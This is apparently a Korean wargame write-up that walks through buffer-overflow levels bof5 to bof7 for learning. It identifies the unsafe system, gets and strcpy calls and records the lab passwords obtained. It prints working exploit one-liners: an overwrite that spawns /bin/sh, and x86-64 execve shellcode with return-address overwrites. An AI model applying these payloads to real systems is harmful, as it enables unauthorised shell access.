# bof5 ~ bof 7

## <bof 5>

### bof5 ID : bof5
### bof5 password : c75cfe84
* bof4를 통해 알아냈음

<과정>
1. ls를 통해 bof5 bof5.c bof5.hint bof6pw가 있음을 알 수 있음(bof6권한 x)
2. (bat bof5.c) bof5.c 소스코드
* buf크기 : 128
* system(buf);
  * system 함수 --> 쉘 실행 

<img src="https://github.com/adakim3297/day3/blob/main/bof5%20%EC%86%8C%EC%8A%A4%EC%BD%94%EB%93%9C.png?raw=true" width="350" height="450"/>

3. bof5 힌트
* 
  <img src = "https://github.com/adakim3297/day3/blob/main/bof5.hint.png?raw=true" width="500" height="110"/> 

*  (python -c "print '/bin/sh\x00' + 'x'*132 +'\x78\x56\x34\x12'" ;cat) | ./bof5

<결과>
<img src = "https://github.com/adakim3297/day3/blob/main/bof6.password.png?raw=true" width ="250" height = "90"/>
* bof6 password : b35aad61


## <bof 6>

### bof6 ID : bof6
### bof6 password : b35aad61

<과정>
1. ls를 통해 bof6 bof6.c bof6.hint bof7pw가 있음을 알 수 있음(bof7권한 x)
2. (bat bof6.c) bof6.c 소스코드
* buf크기 : 128
*gets(buf)

<img src="https://github.com/adakim3297/day3/blob/main/bof6%20-1.png?raw=true" width="450" height="450"/>



1. bof6 힌트
* 
(python -c "print 'x'*< BUF to RETURN ADDRESS >+'< SHELLCODE ADDRESS >'";cat) | ./bof6

*  (python -c "print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'x'*109+'\x30\xeb\xff\xff\xff\x7f'";cat) | ./bof6

<결과>

* bof7 password : ffa35d7e



## <bof 7>
### bof6 ID : bof7
### bof6 password : ffa35d7e
1. ls를 통해 bof7 bof7.c bof7.hint bof8pw가 있음을 알 수 있음(bof7권한 x)
2. (bat bof7.c) bof7.c 소스코드
* buf크기 : 128
* strcpy(buf, arg);
<img src="https://github.com/adakim3297/day3/blob/main/bof7-1.png?raw=true" width="350" height="450"/>

<img src="https://github.com/adakim3297/day3/blob/main/bof7-2.png?raw=true" width="900" height="100"/>

3. ./bof7 `python -c "print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 'x'*109 + '\xb0\xea\xff\xff\xff\x7f'"`

* bof8 password  : 0dc54105